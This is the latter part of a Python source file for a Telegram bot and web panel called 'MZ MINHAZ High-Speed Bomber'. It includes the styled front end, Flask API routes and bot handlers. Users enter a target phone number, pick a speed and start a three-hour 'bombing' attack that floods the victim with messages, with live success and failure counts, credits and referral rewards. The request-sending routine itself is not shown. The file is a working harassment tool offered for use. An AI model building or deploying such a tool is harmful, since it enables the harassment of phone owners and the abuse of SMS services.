  .speed-pill.active .emoji { transform: scale(1.15); }
  .speed-pill.active .name { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.6); }
  .speed-pill.active .time { color: var(--cyan); }
  .speed-pill:active { transform: scale(0.96); }

  /* ====== MAIN ACTION BUTTON ====== */
  .action-btn {
    width: 100%;
    padding: 20px;
    border: none;
    border-radius: 20px;
    background: linear-gradient(135deg, #00ff41, #00cc33);
    color: #000;
    font-family: 'Courier New', monospace;
    font-size: 17px;
    font-weight: 900;
    letter-spacing: 2px;
    text-transform: uppercase;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    box-shadow:
      0 10px 30px rgba(0,255,65,0.4),
      inset 0 -3px 0 rgba(0,0,0,0.2),
      inset 0 1px 0 rgba(255,255,255,0.3);
    transition: all .25s;
    display: flex; align-items: center; justify-content: center; gap: 10px;
  }
  .action-btn::before {
    content: '';
    position: absolute; top: 50%; left: 50%;
    width: 0; height: 0;
    background: rgba(255,255,255,0.4);
    border-radius: 50%;
    transform: translate(-50%, -50%);
    transition: width .6s, height .6s;
  }
  .action-btn:active::before { width: 300px; height: 300px; }
  .action-btn:active { transform: scale(0.97); box-shadow: 0 5px 15px rgba(0,255,65,0.3); }
  .action-btn:disabled {
    background: linear-gradient(135deg, #1a3322, #142618);
    color: var(--muted);
    cursor: not-allowed;
    box-shadow: none;
    transform: none;
  }
  .action-btn.stop {
    background: linear-gradient(135deg, #ff3b3b, #cc2222);
    color: #fff;
    box-shadow: 0 10px 30px rgba(255,59,59,0.4), inset 0 -3px 0 rgba(0,0,0,0.2);
  }

  /* ====== STATS ====== */
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 8px;
  }
  .stat-card {
    background: rgba(0, 20, 5, 0.7);
    border: 1px solid rgba(0,255,65,0.15);
    border-radius: 14px;
    padding: 14px 6px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  .stat-card::after {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 2px;
    background: var(--accent, var(--green));
    box-shadow: 0 0 15px var(--accent, var(--green));
    opacity: 0.6;
  }
  .stat-card.total { --accent: var(--cyan); }
  .stat-card.ok { --accent: var(--green); }
  .stat-card.fail { --accent: var(--red); }
  .stat-val {
    font-family: 'Courier New', monospace;
    font-size: 24px;
    font-weight: 900;
    line-height: 1;
    color: var(--accent, var(--green));
    text-shadow: 0 0 15px var(--accent, var(--green));
    transition: transform .3s;
    display: block;
    margin-bottom: 6px;
  }
  .stat-val.bump { transform: scale(1.2); }
  .stat-lbl {
    font-size: 9px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    color: var(--muted);
    font-weight: 700;
  }

  /* ====== TIMER / PROGRESS ====== */
  #attackInfo {
    display: none;
    padding: 16px 18px;
    background: linear-gradient(135deg, rgba(0,255,65,0.08), rgba(0,255,208,0.03));
    border: 1px solid rgba(0,255,65,0.3);
    border-radius: 16px;
    animation: slideIn .4s ease-out;
  }
  #attackInfo.show { display: block; }
  @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
  .timer-row {
    display: flex; justify-content: space-between; align-items: center;
    margin-bottom: 10px;
  }
  .timer-lbl {
    font-size: 10px;
    letter-spacing: 2px;
    color: var(--muted);
    text-transform: uppercase;
    font-weight: 700;
  }
  .timer-val {
    font-family: 'Courier New', monospace;
    font-size: 18px;
    font-weight: 900;
    color: var(--cyan);
    text-shadow: 0 0 20px rgba(0,255,208,0.7);
    letter-spacing: 1px;
  }
  .progress-track {
    height: 6px;
    background: rgba(0,0,0,0.5);
    border-radius: 100px;
    overflow: hidden;
    border: 1px solid rgba(0,255,65,0.2);
  }
  .progress-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--green), var(--cyan));
    border-radius: 100px;
    transition: width 1s linear;
    box-shadow: 0 0 15px var(--green);
    position: relative;
  }
  .progress-fill::after {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    animation: shimmer 2s infinite;
  }
  @keyframes shimmer { from { transform: translateX(-100%); } to { transform: translateX(100%); } }

  /* ====== STATUS BAR ====== */
  .status-bar {
    display: flex; align-items: center; justify-content: center; gap: 10px;
    padding: 14px;
    background: rgba(0, 20, 5, 0.5);
    border: 1px solid rgba(0,255,65,0.15);
    border-radius: 16px;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--muted);
  }
  .status-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: var(--muted);
    box-shadow: 0 0 10px currentColor;
    transition: all .3s;
  }
  .status-bar.running .status-dot {
    background: var(--green);
    color: var(--green);
    animation: pulseDot 1.2s infinite;
  }
  .status-bar.running {
    color: var(--green);
    text-shadow: 0 0 10px rgba(0,255,65,0.5);
  }
  @keyframes pulseDot {
    0%,100% { box-shadow: 0 0 10px var(--green), 0 0 20px var(--green); }
    50% { box-shadow: 0 0 25px var(--green), 0 0 40px var(--green); }
  }

  /* ====== TOAST ====== */
  #toastBox {
    position: fixed;
    top: 20px; left: 50%; transform: translateX(-50%);
    z-index: 10000;
    display: flex; flex-direction: column; gap: 10px;
    pointer-events: none;
    max-width: 90%;
  }
  .toast {
    padding: 14px 22px;
    border-radius: 14px;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 0.5px;
    backdrop-filter: blur(20px);
    animation: toastIn .35s ease-out, toastOut .35s ease-in 2.65s;
    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    border: 1px solid;
    text-align: center;
  }
  .toast.error {
    background: rgba(255,59,59,0.15);
    border-color: rgba(255,59,59,0.5);
    color: #ff8a8a;
    box-shadow: 0 10px 40px rgba(255,59,59,0.3);
  }
  .toast.success {
    background: rgba(0,255,65,0.15);
    border-color: rgba(0,255,65,0.5);
    color: var(--green);
    box-shadow: 0 10px 40px rgba(0,255,65,0.3);
  }
  .toast.info {
    background: rgba(0,255,208,0.12);
    border-color: rgba(0,255,208,0.4);
    color: var(--cyan);
  }
  @keyframes toastIn { from { opacity: 0; transform: translate(-50%, -20px); } to { opacity: 1; transform: translate(-50%, 0); } }
  @keyframes toastOut { to { opacity: 0; transform: translate(-50%, -20px); } }

  /* ====== LOCK SCREEN ====== */
  #lockScreen {
    display: none;
    text-align: center;
    padding: 50px 24px;
    background: var(--panel);
    border: 1px solid rgba(255,59,59,0.4);
    border-radius: 24px;
    backdrop-filter: blur(24px);
  }
  #lockScreen.show { display: block; }
  #lockScreen .lock-icon {
    font-size: 60px;
    margin-bottom: 20px;
    filter: drop-shadow(0 0 20px rgba(255,59,59,0.6));
  }
  #lockScreen h2 {
    font-family: 'Courier New', monospace;
    color: var(--red);
    font-size: 24px;
    margin-bottom: 12px;
    letter-spacing: 3px;
    text-transform: uppercase;
    text-shadow: 0 0 20px rgba(255,59,59,0.6);
  }
  #lockScreen p {
    color: #b08080;
    font-size: 14px;
    line-height: 1.7;
    margin-bottom: 24px;
  }
  .btn-ghost {
    padding: 14px 32px;
    background: rgba(255,59,59,0.15);
    border: 1px solid rgba(255,59,59,0.5);
    border-radius: 100px;
    color: #ff8a8a;
    font-family: 'Courier New', monospace;
    font-weight: 800;
    font-size: 13px;
    letter-spacing: 2px;
    text-transform: uppercase;
    cursor: pointer;
    transition: all .2s;
  }
  .btn-ghost:active { transform: scale(0.95); }

  /* ====== FOOTER ====== */
  .footer {
    text-align: center;
    padding: 12px 0 0;
    font-size: 11px;
    color: var(--muted);
    letter-spacing: 2px;
    text-transform: uppercase;
  }
  .footer strong { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.5); }

  /* ====== SETTINGS POPUP ====== */
  .overlay {
    position: fixed; inset: 0; z-index: 9998;
    background: rgba(0,0,0,0.9);
    backdrop-filter: blur(12px);
    display: none;
    align-items: center; justify-content: center;
    padding: 20px;
  }
  .overlay.show { display: flex; }
  .modal {
    background: linear-gradient(160deg, #0a1a10, #050a08);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 32px 24px;
    max-width: 380px; width: 100%;
    text-align: center;
    box-shadow: 0 30px 80px rgba(0,255,65,0.2);
    animation: modalIn .3s ease-out;
  }
  @keyframes modalIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .modal h3 {
    font-family: 'Courier New', monospace;
    color: var(--green);
    font-size: 20px;
    letter-spacing: 3px;
    margin-bottom: 8px;
    text-transform: uppercase;
  }
  .modal p { color: var(--muted); font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
  .modal-btn {
    padding: 14px 30px;
    background: linear-gradient(135deg, var(--green), #00cc33);
    border: none;
    border-radius: 100px;
    color: #000;
    font-family: 'Courier New', monospace;
    font-weight: 900;
    font-size: 14px;
    letter-spacing: 2px;
    text-transform: uppercase;
    cursor: pointer;
    margin: 4px;
    transition: all .2s;
  }
  .modal-btn.ghost {
    background: rgba(0,255,65,0.1);
    border: 1px solid var(--border);
    color: var(--green);
  }
  .modal-btn:active { transform: scale(0.96); }

  ::-webkit-scrollbar { width: 0; }
</style>
</head>
<body>

<div id="loader">
  <div class="spinner"></div>
  <div class="load-text">INITIALIZING</div>
</div>

<canvas id="matrix"></canvas>
<div class="bg-glow"></div>

<div id="toastBox"></div>

<div class="app">

  <!-- TOP BAR -->
  <div class="top-bar">
    <div class="credits-pill">
      <span class="icon">💎</span>
      <span class="val" id="creditVal">0</span>
      <span class="lbl">credits</span>
    </div>
    <button class="close-btn" onclick="confirmExit()">✕</button>
  </div>

  <!-- BRAND -->
  <div class="brand">
    <h1>MZ MINHAZ</h1>
    <div class="tagline">High-Speed Bomber</div>
    <div class="divider"></div>
  </div>

  <!-- MAIN PANEL -->
  <div id="mainPanel" style="display:none;">

    <div class="card">
      <div class="label"><span class="ico">📱</span> Target Phone</div>
      <div class="phone-wrap">
        <span class="phone-prefix">01</span>
        <input type="tel" id="phone" placeholder="XXXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="off">
      </div>
    </div>

    <div class="card" style="margin-top:14px;">
      <div class="label"><span class="ico">⚡</span> Speed Mode</div>
      <div class="speed-pills">
        <div class="speed-pill" data-speed="fast">
          <span class="emoji">🚀</span>
          <span class="name">Fast</span>
          <span class="time">0.0s</span>
        </div>
        <div class="speed-pill active" data-speed="medium">
          <span class="emoji">⚡</span>
          <span class="name">Medium</span>
          <span class="time">0.15s</span>
        </div>
        <div class="speed-pill" data-speed="slow">
          <span class="emoji">🐢</span>
          <span class="name">Slow</span>
          <span class="time">0.4s</span>
        </div>
      </div>
    </div>

    <div id="attackInfo">
      <div class="timer-row">
        <span class="timer-lbl">⏱ Time Left</span>
        <span class="timer-val" id="timerVal">03:00:00</span>
      </div>
      <div class="progress-track">
        <div class="progress-fill" id="progressFill" style="width: 0%"></div>
      </div>
    </div>

    <button class="action-btn" id="startBtn" style="margin-top:14px;" onclick="startAttack()">
      <span>▶</span> START BOMBING
    </button>

    <button class="action-btn stop" id="stopBtn" style="margin-top:10px; display:none;" onclick="stopAttack()">
      <span>⏹</span> STOP ATTACK
    </button>

    <div style="margin-top:18px;">
      <div class="label"><span class="ico">📊</span> Live Statistics</div>
      <div class="stats-grid">
        <div class="stat-card total">
          <span class="stat-val" id="statTotal">0</span>
          <span class="stat-lbl">Total</span>
        </div>
        <div class="stat-card ok">
          <span class="stat-val" id="statOk">0</span>
          <span class="stat-lbl">Success</span>
        </div>
        <div class="stat-card fail">
          <span class="stat-val" id="statFail">0</span>
          <span class="stat-lbl">Failed</span>
        </div>
      </div>
    </div>

    <div class="status-bar" id="statusBar" style="margin-top:14px;">
      <span class="status-dot"></span>
      <span id="statusText">Idle</span>
    </div>

    <div class="footer">Developed by <strong>MZ MINHAZ</strong></div>
  </div>

  <!-- LOCK SCREEN -->
  <div id="lockScreen">
    <div class="lock-icon">🔒</div>
    <h2>Access Locked</h2>
    <p id="lockMsg">You need at least 1 credit to start bombing. Invite friends to earn more credits.</p>
    <button class="btn-ghost" onclick="tg.close()">Close Panel</button>
  </div>

</div>

<!-- EXIT CONFIRM MODAL -->
<div class="overlay" id="exitModal">
  <div class="modal">
    <h3>Close Panel?</h3>
    <p>Your active attack (if any) will continue running in the background.</p>
    <button class="modal-btn ghost" onclick="closeExitModal()">Cancel</button>
    <button class="modal-btn" onclick="doExit()">Close</button>
  </div>
</div>

<script>
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }
  const initData = tg?.initData || '';

  // ===== STATE =====
  const state = {
    phone: '',
    speed: 'medium',
    running: false,
    credits: 0,
    endTime: 0,
    total: 0, ok: 0, fail: 0,
    lastTotal: 0, lastOk: 0, lastFail: 0,
  };

  // ===== HAPTIC =====
  function haptic(type) {
    try {
      if (!tg?.HapticFeedback) return;
      if (type === 'success') tg.HapticFeedback.notificationOccurred('success');
      else if (type === 'error') tg.HapticFeedback.notificationOccurred('error');
      else if (type === 'light') tg.HapticFeedback.impactOccurred('light');
      else if (type === 'medium') tg.HapticFeedback.impactOccurred('medium');
    } catch(e) {}
  }

  // ===== TOAST =====
  function toast(msg, type = 'info') {
    const box = document.getElementById('toastBox');
    const el = document.createElement('div');
    el.className = 'toast ' + type;
    el.textContent = msg;
    box.appendChild(el);
    setTimeout(() => el.remove(), 3200);
  }

  // ===== MATRIX RAIN =====
  (function() {
    const c = document.getElementById('matrix');
    const ctx = c.getContext('2d');
    let w, h, cols, drops;
    const chars = 'MZMINHAZ01天地玄黄宇宙洪荒0123456789';
    const arr = chars.split('');
    const fontSize = 16;
    function resize() {
      w = c.width = window.innerWidth;
      h = c.height = window.innerHeight;
      cols = Math.floor(w / fontSize);
      drops = Array(cols).fill(1);
    }
    function draw() {
      ctx.fillStyle = 'rgba(5,6,8,0.08)';
      ctx.fillRect(0, 0, w, h);
      ctx.fillStyle = '#00ff41';
      ctx.font = fontSize + 'px "Courier New", monospace';
      for (let i = 0; i < drops.length; i++) {
        const ch = arr[Math.floor(Math.random() * arr.length)];
        ctx.fillText(ch, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    }
    resize();
    window.addEventListener('resize', resize);
    setInterval(draw, 60);
  })();

  // ===== PHONE INPUT =====
  const phoneInput = document.getElementById('phone');
  phoneInput.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '').slice(0, 9);
  });

  // ===== SPEED SELECTOR =====
  document.querySelectorAll('.speed-pill').forEach(p => {
    p.addEventListener('click', () => {
      document.querySelectorAll('.speed-pill').forEach(x => x.classList.remove('active'));
      p.classList.add('active');
      state.speed = p.dataset.speed;
      haptic('light');
    });
  });

  // ===== ANIMATE NUMBER =====
  function setNum(id, val, bump = true) {
    const el = document.getElementById(id);
    if (!el) return;
    const cur = parseInt(el.textContent) || 0;
    if (cur === val) return;
    el.textContent = val;
    if (bump) {
      el.classList.add('bump');
      setTimeout(() => el.classList.remove('bump'), 300);
    }
  }

  // ===== AUTH =====
  async function checkAuth() {
    try {
      const r = await fetch('/api/auth', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({initData})
      });
      const d = await r.json();
      document.getElementById('loader').classList.add('hide');
      setTimeout(() => document.getElementById('loader').remove(), 600);

      if (d.status === 'error') {
        document.getElementById('mainPanel').style.display = 'none';
        document.getElementById('lockScreen').classList.add('show');
        document.getElementById('lockMsg').textContent = d.message;
        return;
      }
      document.getElementById('mainPanel').style.display = 'block';
      document.getElementById('lockScreen').classList.remove('show');
      pollStatus();
    } catch(e) {
      document.getElementById('loader').classList.add('hide');
      toast('Connection failed. Try again.', 'error');
    }
  }

  // ===== POLL =====
  async function pollStatus() {
    try {
      const r = await fetch('/api/status', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({initData})
      });
      const d = await r.json();
      if (d.status !== 'ok') return;

      setNum('statTotal', d.total);
      setNum('statOk', d.ok);
      setNum('statFail', d.fail);
      setNum('creditVal', d.credits, false);

      const wasRunning = state.running;
      state.running = d.running;
      state.endTime = d.end_time || 0;
      state.credits = d.credits;

      updateUI();

      if (wasRunning && !d.running) {
        toast('Attack finished!', 'success');
        haptic('success');
      }
    } catch(e) {}
  }

  // ===== UPDATE UI =====
  function updateUI() {
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const statusBar = document.getElementById('statusBar');
    const statusText = document.getElementById('statusText');
    const attackInfo = document.getElementById('attackInfo');

    if (state.running) {
      startBtn.style.display = 'none';
      stopBtn.style.display = 'flex';
      statusBar.classList.add('running');
      statusText.textContent = 'Attacking...';
      attackInfo.classList.add('show');
    } else {
      startBtn.style.display = 'flex';
      stopBtn.style.display = 'none';
      statusBar.classList.remove('running');
      statusText.textContent = 'Idle';
      attackInfo.classList.remove('show');
    }
  }

  // ===== TIMER =====
  setInterval(() => {
    if (!state.running || !state.endTime) return;
    const now = Date.now() / 1000;
    const left = Math.max(0, state.endTime - now);
    const h = Math.floor(left / 3600);
    const m = Math.floor((left % 3600) / 60);
    const s = Math.floor(left % 60);
    document.getElementById('timerVal').textContent =
      String(h).padStart(2,'0') + ':' +
      String(m).padStart(2,'0') + ':' +
      String(s).padStart(2,'0');
    const total = 3 * 3600;
    const pct = Math.min(100, ((total - left) / total) * 100);
    document.getElementById('progressFill').style.width = pct + '%';
  }, 1000);

  // ===== START =====
  async function startAttack() {
    const digits = phoneInput.value.replace(/\D/g, '');
    if (digits.length !== 9) {
      toast('Enter 9 digits after 01', 'error');
      haptic('error');
      phoneInput.focus();
      return;
    }
    const fullPhone = '01' + digits;

    haptic('medium');
    const btn = document.getElementById('startBtn');
    btn.disabled = true;

    try {
      const r = await fetch('/api/start', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({initData, phone: fullPhone, speed: state.speed})
      });
      const d = await r.json();
      if (d.status === 'ok') {
        toast('Bombing started! 🚀', 'success');
        haptic('success');
        pollStatus();
      } else {
        toast(d.message || 'Failed to start', 'error');
        haptic('error');
        btn.disabled = false;
      }
    } catch(e) {
      toast('Connection error', 'error');
      haptic('error');
      btn.disabled = false;
    }
  }

  // ===== STOP =====
  async function stopAttack() {
    haptic('medium');
    try {
      await fetch('/api/stop', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({initData})
      });
      toast('Attack stopped', 'info');
      pollStatus();
    } catch(e) {
      toast('Connection error', 'error');
    }
  }

  // ===== EXIT =====
  function confirmExit() {
    haptic('light');
    document.getElementById('exitModal').classList.add('show');
  }
  function closeExitModal() {
    document.getElementById('exitModal').classList.remove('show');
  }
  function doExit() {
    closeExitModal();
    if (tg?.close) tg.close();
  }

  // ===== INIT =====
  window.addEventListener('load', () => {
    if (!initData) {
      document.getElementById('loader').classList.add('hide');
      document.body.innerHTML = '<div style="color:#ff3b3b;text-align:center;padding:80px 20px;font-family:monospace;font-size:18px;">⚠️ Please open from Telegram</div>';
      return;
    }
    checkAuth();
    setInterval(pollStatus, 1500);
  });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/auth', methods=['POST'])
def api_auth():
    data = request.get_json()
    init_data = data.get('initData')
    user = verify_telegram_init_data(init_data, BOT_TOKEN)
    if not user:
        return jsonify({'status': 'error', 'message': 'Invalid authentication. Please open from Telegram.'})
    chat_id = user['id']
    with bot_attack_lock:
        st = bot_attacks.get(chat_id, {})
        if st.get('running'):
            return jsonify({'status': 'ok'})
    row = user_get(chat_id)
    if not row:
        user_create(chat_id, user.get('username'), user.get('first_name'))
        row = user_get(chat_id)
    if row[1] < 1 and chat_id != ADMIN_ID:
        return jsonify({'status': 'error', 'message': 'No credits available. You need at least 1 credit to start bombing.'})
    return jsonify({'status': 'ok'})

@app.route('/api/start', methods=['POST'])
def api_start():
    data = request.get_json()
    user = verify_telegram_init_data(data.get('initData'), BOT_TOKEN)
    if not user: return jsonify({'status': 'error', 'message': 'Invalid auth'})
    chat_id = user['id']
    phone = data.get('phone', '').strip()
    speed = data.get('speed', 'fast')
    if len(phone) != 11 or not phone.startswith('01'):
        return jsonify({'status': 'error', 'message': 'Invalid phone.'})
    with bot_attack_lock:
        if chat_id in bot_attacks and bot_attacks[chat_id].get("running"):
            return jsonify({'status': 'error', 'message': 'Attack already running'})
    if chat_id != ADMIN_ID:
        if not credits_take(chat_id, 1):
            return jsonify({'status': 'error', 'message': 'Not enough credits'})
    end_time = time.time() + BOMB_DURATION_SEC
    with bot_attack_lock:
        bot_attacks[chat_id] = {
            "running": True, "stop_flag": False,
            "total": 0, "ok": 0, "fail": 0,
            "phone": phone, "end_time": end_time
        }
    _spawn(phone, speed, chat_id, bot_attacks, bot_attack_lock, end_time)
    db_query("UPDATE users SET total_attacks = total_attacks + 1 WHERE chat_id=?", (chat_id,))
    return jsonify({'status': 'ok'})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    data = request.get_json()
    user = verify_telegram_init_data(data.get('initData'), BOT_TOKEN)
    if not user: return jsonify({'status': 'error', 'message': 'Invalid auth'})
    chat_id = user['id']
    with bot_attack_lock:
        st = bot_attacks.get(chat_id)
        if st: st['stop_flag'] = True
    return jsonify({'status': 'ok'})

@app.route('/api/status', methods=['POST'])
def api_status():
    data = request.get_json()
    user = verify_telegram_init_data(data.get('initData'), BOT_TOKEN)
    if not user: return jsonify({'status': 'error', 'message': 'Invalid auth'})
    chat_id = user['id']
    with bot_attack_lock:
        st = bot_attacks.get(chat_id, {})
        row = user_get(chat_id)
        credits = row[1] if row else 0
        return jsonify({
            'status': 'ok',
            'running': st.get('running', False),
            'total': st.get('total', 0),
            'ok': st.get('ok', 0),
            'fail': st.get('fail', 0),
            'phone': st.get('phone', ''),
            'credits': credits,
            'end_time': st.get('end_time', 0)
        })

# ============ BOT HANDLERS ============
BOT_USERNAME = None

async def is_joined(context, user_id):
    if user_id == ADMIN_ID: return True
    try:
        m = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False

async def gate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if user.id == ADMIN_ID: return True
    if await is_joined(context, user.id): return True
    kb = [[InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)],
          [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]]
    target = update.effective_message or update.callback_query.message
    await target.reply_text(
        "⚠️ *You must join our channel to use this bot.*\n\n" f"Channel: {CHANNEL_URL}",
        parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb)
    )
    return False

def is_banned(chat_id):
    row = user_get(chat_id)
    return bool(row and row[3] == 1)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = user.id
    if is_banned(chat_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if not await gate(update, context): return
    ref_by = 0
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref_by = int(context.args[0][4:])
            if ref_by == chat_id: ref_by = 0
        except: ref_by = 0
    is_new = not user_exists(chat_id)
    user_create(chat_id, user.username, user.first_name, ref_by)
    if is_new and ref_by and user_exists(ref_by):
        referrer = user_get(ref_by)
        if referrer and referrer[4] == 0:
            credits_add(ref_by, REF_CREDITS)
            db_query("UPDATE users SET referred_once=1 WHERE chat_id=?", (chat_id,))
            try:
                await context.bot.send_message(ref_by, f"🎉 Someone joined via your referral!\n+{REF_CREDITS} credits added. 💎")
            except: pass
    row = user_get(chat_id)
    credits = row[1] if row else 0
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{chat_id}"
    text = (
        f"👋 *Welcome, {user.first_name}!*\n\n"
        f"👨‍💻 Developer: *{DEVELOPER_NAME}*\n"
        f"💎 Credits: *{credits}*\n\n"
        f"🎁 New users get *{WELCOME_CREDITS} free credits*.\n"
        f"👥 Invite friends → *+{REF_CREDITS} credits* each.\n"
        f"⏱ 1 credit = *3 hours* of bombing.\n\n"
        f"🔗 Referral link:\n`{ref_link}`\n\n"
        f"📢 Channel: {CHANNEL_URL}"
    )
    kb = [
        [InlineKeyboardButton("🚀 Start Bombing (Web Panel)", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("📢 Channel", url=CHANNEL_URL),
         InlineKeyboardButton("💎 Balance", callback_data="balance")]
    ]
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context): return
    row = user_get(update.effective_user.id)
    if not row:
        await update.effective_message.reply_text("Use /start first.")
        return
    await update.effective_message.reply_text(
        f"💎 *Balance:* {row[1]} credits\n⚔️ Total attacks: {row[5]}",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context): return
    chat_id = update.effective_user.id
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{chat_id}"
    await update.effective_message.reply_text(
        f"👥 *Referral Link*\n\n`{link}`\n\nEach friend earns you *+{REF_CREDITS} credits*.",
        parse_mode=ParseMode.MARKDOWN
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    user = q.from_user
    if data == "check_join":
        if await is_joined(context, user.id):
            await q.edit_message_text("✅ Verified. You can now use the bot. Send /start.")
        else:
            await q.edit_message_text("❌ You haven't joined yet. Join and try again.\n\n📢 " + CHANNEL_URL)
        return
    if data == "balance":
        if not await gate(update, context): return
        row = user_get(user.id)
        await q.message.reply_text(f"💎 *Balance:* {row[1] if row else 0} credits", parse_mode=ParseMode.MARKDOWN)
        return

async def post_init(app: Application):
    global BOT_USERNAME
    me = await app.bot.get_me()
    BOT_USERNAME = me.username
    try:
        await app.bot.set_chat_menu_button(
            menu_button=MenuButtonWebApp(text="🌐 Panel", web_app=WebAppInfo(url=WEBAPP_URL))
        )
    except Exception as e:
        print(f"[menu-button] failed: {e}")

# ============ ENTRY ============
def run_flask(port):
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True, use_reloader=False)

def main():
    db_init()
    port = get_free_port()
    print(f"[boot] {DEVELOPER_NAME} bot starting...")
    print(f"[boot] Flask on 127.0.0.1:{port}")
    threading.Thread(target=run_flask, args=(port,), daemon=True).start()
    if not wait_for_server(port):
        print("[ERROR] Flask failed to start")
        sys.exit(1)
    print("[boot] Flask up!")
    global WEBAPP_URL
    tunnel_process = None
    if not WEBAPP_URL:
        print("[boot] Starting Cloudflare tunnel...")
        WEBAPP_URL, tunnel_process = start_cloudflare_tunnel(port)
    else:
        print(f"[boot] Using WEBAPP_URL: {WEBAPP_URL}")
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("balance", cmd_balance))
    application.add_handler(CommandHandler("credits", cmd_balance))
    application.add_handler(CommandHandler("refer", cmd_refer))
    application.add_handler(CallbackQueryHandler(callback_handler))
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    finally:
        if tunnel_process:
            print("[boot] Shutting down tunnel...")
            tunnel_process.terminate()

if __name__ == "__main__":
    main()
